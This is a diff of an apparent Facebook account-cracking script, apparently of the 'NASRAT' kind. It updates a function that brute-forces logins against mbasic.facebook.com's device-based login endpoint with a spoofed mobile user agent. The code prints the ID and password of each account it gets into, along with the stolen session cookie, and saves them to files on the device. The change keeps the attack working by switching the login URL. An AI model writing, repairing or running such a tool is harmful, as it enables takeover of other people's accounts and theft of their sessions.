@@ -432,13 +432,14 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/600.7.24 (KHTML, like Gecko) Version/11.3.31 Mobile/0EHJU3 Safari/615.10.9',
-    'viewport-width': '980',}    
-             lo = session.post('https://mbasic.facebook.com/',data=log_data,headers=header_freefb).text,
+    'viewport-width': '980',}
+
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text,
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(NASRAT➥OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(NASRAT -OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/NASRAT-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
@@ -446,7 +447,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(NASRAT-CP💔)     ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(NASRAT-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/NASRAT-CP.txt', 'a').write(uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
